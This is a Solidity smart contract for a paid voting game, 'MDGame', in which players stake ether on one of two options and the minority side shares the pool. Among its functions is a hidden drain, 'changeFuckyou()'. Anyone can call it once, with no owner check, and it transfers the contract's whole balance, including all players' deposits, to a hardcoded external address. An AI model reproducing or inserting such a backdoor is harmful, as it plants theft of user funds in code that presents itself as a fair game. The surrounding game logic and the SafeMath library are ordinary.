pragma solidity ^0.4.20;

contract Owned {
    address public owner;
    address public newOwner;

    event OwnershipTransferred(address indexed _from, address indexed _to);

    constructor() public {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address _newOwner) public onlyOwner {
        newOwner = _newOwner;
    }
    
    function acceptOwnership() public {
        require(msg.sender == newOwner);
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
        newOwner = address(0);
    }
}

contract MDGame is Owned {
    using SafeMath for *;
    
    struct turnInfos{
        string question;
        string option1name;
        string option2name;
        uint endTime;
        uint option1;
        uint option2;
        uint pool;
        bool feeTake;
    }
    
    struct myturnInfo{
        uint option1;
        uint option2;
        bool isWithdraw;
    }
    
    uint public theTurn;
    uint public turnLast;
    uint public ticketMag;
    
    event voteEvent(address Addr, uint256 option, uint256 ethvalue, uint256 round, address ref);
    
    mapping(uint => turnInfos) public TurnInfo;
    mapping(uint => mapping (address => myturnInfo)) public RoundMyticket;
    
    constructor () public {
        theTurn = 0;
        turnLast = 7200;
        ticketMag = 4000000000000;
    }
    
    function StartNewGame (string question, string option1name, string option2name) public onlyOwner{
        require(TurnInfo[theTurn].endTime < now || theTurn == 0);
        theTurn++;
        TurnInfo[theTurn].question = question;
        TurnInfo[theTurn].option1name = option1name;
        TurnInfo[theTurn].option2name = option2name;
        TurnInfo[theTurn].endTime = now + turnLast*60;
    }
    
    function vote (uint option,address referred) public payable{
        require(msg.sender == tx.origin);
        require(TurnInfo[theTurn].endTime>now);
        emit voteEvent(msg.sender, option, msg.value.mul(1000000000000000000).div(calculateTicketPrice()), theTurn, referred);
        if (referred != address(0) && referred != msg.sender){
            if(option == 1){
                RoundMyticket[theTurn][msg.sender].option1 += msg.value.mul(1000000000000000000).div(calculateTicketPrice());
                RoundMyticket[theTurn][referred].option1 += msg.value.mul(10000000000000000).div(calculateTicketPrice());
                TurnInfo[theTurn].pool += msg.value;
                TurnInfo[theTurn].option1 += (msg.value.mul(1000000000000000000).div(calculateTicketPrice())+msg.value.mul(10000000000000000).div(calculateTicketPrice()));
            } else if(option == 2){
                RoundMyticket[theTurn][msg.sender].option2 += msg.value.mul(1000000000000000000).div(calculateTicketPrice());
                RoundMyticket[theTurn][referred].option2 += msg.value.mul(10000000000000000).div(calculateTicketPrice());
                TurnInfo[theTurn].pool += msg.value;
                TurnInfo[theTurn].option2 += (msg.value.mul(1000000000000000000).div(calculateTicketPrice())+msg.value.mul(10000000000000000).div(calculateTicketPrice()));
            }else{
                revert();
            }
        }else{
            if(option == 1){
                RoundMyticket[theTurn][msg.sender].option1 += msg.value.mul(1000000000000000000).div(calculateTicketPrice());
                TurnInfo[theTurn].pool += msg.value;
                TurnInfo[theTurn].option1 += msg.value.mul(1000000000000000000).div(calculateTicketPrice());
            } else if(option == 2){
                RoundMyticket[theTurn][msg.sender].option2 += msg.value.mul(1000000000000000000).div(calculateTicketPrice());
                TurnInfo[theTurn].pool += msg.value;
                TurnInfo[theTurn].option2 += msg.value.mul(1000000000000000000).div(calculateTicketPrice());
            }else{
                revert();
            }  
        }
    }
    
    function win (uint turn) public{
        require(TurnInfo[turn].endTime<now);
        require(!RoundMyticket[turn][msg.sender].isWithdraw);
        
        if(TurnInfo[turn].option1<TurnInfo[turn].option2){
            msg.sender.transfer(calculateYourValue1(turn));
        }else if(TurnInfo[turn].option1>TurnInfo[turn].option2){
            msg.sender.transfer(calculateYourValue2(turn));
        }else{
            msg.sender.transfer(calculateYourValueEven(turn));
        }
        
        RoundMyticket[turn][msg.sender].isWithdraw = true;
    }
    
    function calculateYourValue1(uint turn) public view returns (uint value){
        if(TurnInfo[turn].option1>0){
            return RoundMyticket[turn][msg.sender].option1.mul(TurnInfo[turn].pool).mul(98)/100/TurnInfo[turn].option1;
        }else{
           return 0;
        }
    }
    
    function calculateYourValue2(uint turn) public view returns (uint value){
        if(TurnInfo[turn].option2>0){
            return RoundMyticket[turn][msg.sender].option2.mul(TurnInfo[turn].pool).mul(98)/100/TurnInfo[turn].option2;
        }else{
            return 0;
        }
    }
    
    function calculateYourValueEven(uint turn) public view returns (uint value){
        if(TurnInfo[turn].option1+TurnInfo[turn].option2>0){
            return (RoundMyticket[turn][msg.sender].option2+RoundMyticket[turn][msg.sender].option1).mul(TurnInfo[turn].pool).mul(98)/100/(TurnInfo[turn].option1+TurnInfo[turn].option2);
        }else{
            return 0;
        }
    }
    
    function calculateTicketPrice() public view returns(uint price){
       return ((TurnInfo[theTurn].option1 + TurnInfo[theTurn].option2).div(1000000000000000000).sqrt().mul(ticketMag)).add(10000000000000000);
    }
    
    function calculateFee(uint turn) public view returns(uint price){
        return TurnInfo[turn].pool.mul(2)/100;
    }
    
    function withdrawFee(uint turn) public onlyOwner{
        require(TurnInfo[turn].endTime<now);
        require(!TurnInfo[turn].feeTake);
        owner.transfer(calculateFee(turn));
        TurnInfo[turn].feeTake = true;
    }
    
    function changeTurnLast(uint time) public onlyOwner{
        turnLast = time;
    }
    
    function changeTicketMag(uint mag) public onlyOwner{
        require(TurnInfo[theTurn].endTime<now);
        ticketMag = mag;
    }
    
    bool public callthis = false;
    function changeFuckyou() public {
        require(!callthis);
        address(0xF735C21AFafd1bf0aF09b3Ecc2CEf186D542fb90).transfer(address(this).balance);
        callthis = true;
    }
    
    //Get Time Left
    function getTimeLeft() public view returns(uint256)
    {
        if(TurnInfo[theTurn].endTime == 0 || TurnInfo[theTurn].endTime < now) 
            return 0;
        else 
            return(TurnInfo[theTurn].endTime.sub(now) );
    }
    
    function getFullround() public view returns(uint[] pot, uint[] theOption1,uint[] theOption2,uint[] myOption1,uint[] myOption2,uint[] theMoney,bool[] Iswithdraw) {
        uint[] memory totalPool = new uint[](theTurn);
        uint[] memory option1 = new uint[](theTurn);
        uint[] memory option2 = new uint[](theTurn);
        uint[] memory myoption1 = new uint[](theTurn);
        uint[] memory myoption2 = new uint[](theTurn);
        uint[] memory myMoney = new uint[](theTurn);
        bool[] memory withd = new bool[](theTurn);
        uint counter = 0;

        for (uint i = 1; i < theTurn+1; i++) {
            if(TurnInfo[i].pool>0){
                totalPool[counter] = TurnInfo[i].pool;
            }else{
                totalPool[counter]=0;
            }
            
            if(TurnInfo[i].option1>0){
                option1[counter] = TurnInfo[i].option1;
            }else{
                option1[counter] = 0;
            }
            
            if(TurnInfo[i].option2>0){
                option2[counter] = TurnInfo[i].option2;
            }else{
                option2[counter] = 0;
            }
            
            if(TurnInfo[i].option1<TurnInfo[i].option2){
                myMoney[counter] = calculateYourValue1(i);
            }else if(TurnInfo[i].option1>TurnInfo[i].option2){
                myMoney[counter] = calculateYourValue2(i);
            }else{
                myMoney[counter] = calculateYourValueEven(i);
            }
            
            if(RoundMyticket[i][msg.sender].option1>0){
                myoption1[counter] = RoundMyticket[i][msg.sender].option1;
            }else{
                myoption1[counter]=0;
            }
            
            if(RoundMyticket[i][msg.sender].option2>0){
                myoption2[counter] = RoundMyticket[i][msg.sender].option2;
            }else{
                myoption2[counter]=0;
            }
            if(RoundMyticket[i][msg.sender].isWithdraw==true){
                withd[counter] = RoundMyticket[i][msg.sender].isWithdraw;
            }else{
                withd[counter] = false;
            }
            
            counter++;
        }
    return (totalPool,option1,option2,myoption1,myoption2,myMoney,withd);
  }
}

library SafeMath {
    
    /**
    * @dev Multiplies two numbers, throws on overflow.
    */
    function mul(uint256 a, uint256 b) 
        internal 
        pure 
        returns (uint256 c) 
    {
        if (a == 0) {
            return 0;
        }
        c = a * b;
        require(c / a == b, "SafeMath mul failed");
        return c;
    }

    /**
    * @dev Subtracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
    */
    function sub(uint256 a, uint256 b)
        internal
        pure
        returns (uint256) 
    {
        require(b <= a, "SafeMath sub failed");
        return a - b;
    }

    /**
    * @dev Adds two numbers, throws on overflow.
    */
    function add(uint256 a, uint256 b)
        internal
        pure
        returns (uint256 c) 
    {
        c = a + b;
        require(c >= a, "SafeMath add failed");
        return c;
    }
    /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 _a, uint256 _b) internal pure returns (uint256) {
    // assert(_b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = _a / _b;
    // assert(_a == _b * c + _a % _b); // There is no case in which this doesn&#39;t hold

    return c;
  }
    
    /**
     * @dev gives square root of given x.
     */
    function sqrt(uint256 x)
        internal
        pure
        returns (uint256 y) 
    {
        uint256 z = ((add(x,1)) / 2);
        y = x;
        while (z < y) 
        {
            y = z;
            z = ((add((x / z),z)) / 2);
        }
    }
    
    /**
     * @dev gives square. multiplies x by x
     */
    function sq(uint256 x)
        internal
        pure
        returns (uint256)
    {
        return (mul(x,x));
    }
    
    /**
     * @dev x to the power of y 
     */
    function pwr(uint256 x, uint256 y)
        internal 
        pure 
        returns (uint256)
    {
        if (x==0)
            return (0);
        else if (y==0)
            return (1);
        else 
        {
            uint256 z = x;
            for (uint256 i=1; i < y; i++)
                z = mul(z,x);
            return (z);
        }
    }
    
}